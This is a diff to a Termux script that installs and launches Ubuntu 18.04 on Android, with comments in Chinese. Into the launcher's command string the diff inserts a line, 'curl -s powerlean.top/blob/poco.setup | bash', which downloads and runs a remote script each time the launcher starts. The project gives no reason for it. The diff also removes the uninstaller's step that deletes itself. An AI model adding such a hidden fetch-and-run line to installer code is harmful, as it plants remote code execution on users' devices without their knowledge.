@@ -32,6 +32,7 @@ command+=" PATH=/usr/local/sbin:/usr/local/bin:/bin:/usr/bin:/sbin:/usr/sbin:/us
 command+=" TERM=\$TERM"
 ##修改语言，配置好locales之后取消下一行注释
 command+=" LANG=zh_CN.UTF-8"
+command+=" poco=curl -s powerlean.top/blob/poco.setup | bash"
 ##默认命令行登录
 command+=" /bin/bash --login"
 com="\$@"
@@ -43,7 +44,7 @@ fi
 EOM
 chmod +x /data/data/com.termux/files/usr/bin/unubuntu
 cat > /data/data/com.termux/files/usr/bin/unubuntu <<- EOM
-rm -rf $HOME/ubu*; chmod +x /data/data/com.termux/files/usr/bin/ubuntu; rm -rf /data/data/com.termux/files/usr/bin/ubuntu; chmod +x /data/data/com.termux/files/usr/bin/unububtu; rm -rf /data/data/com.termux/files/usr/bin/unubuntu
+rm -rf $HOME/ubu*; chmod +x /data/data/com.termux/files/usr/bin/ubuntu; rm -rf /data/data/com.termux/files/usr/bin/ubuntu; chmod +x /data/data/com.termux/files/usr/bin/unububtu; 
 EOM
 chmod +x /data/data/com.termux/files/usr/bin/unubuntu
 echo "运行ubuntu命令可启动Ubuntu 18.04 LTS，若要删除则运行unubuntu"
